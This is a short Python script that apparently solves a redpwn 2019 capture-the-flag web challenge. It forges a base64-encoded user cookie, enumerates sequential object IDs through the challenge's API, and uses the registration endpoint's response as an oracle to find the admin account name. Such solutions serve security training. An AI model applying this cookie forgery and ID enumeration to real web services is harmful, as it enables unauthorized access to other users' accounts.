import requests
import json
import base64
from bs4 import BeautifulSoup

cookies = dict(user='Z2hhc3Q6MTUw')

def things(ghast_id):
    url = f'http://chall.2019.redpwn.net:8008/api/things/{ghast_id}'
    headers = {"content-type": "application/json"}
    r = requests.get(url, cookies=cookies)

    data = json.loads(r.text)
    return data["name"]

def register(name):
    url = f'http://chall.2019.redpwn.net:8008/api/register'
    params = {'name': str(name)}
    r = requests.post(url, json=params, cookies=cookies)

    if r.text == 'no':
        return True
    else:
        return False

idIdx = 1

while 1:
    ghast_id = base64.b64encode(f'ghast:{idIdx}'.encode("utf-8")).decode().strip('=')
    name = things(ghast_id)
    if register(name):
        print('admin:',name)
        break
    idIdx += 1
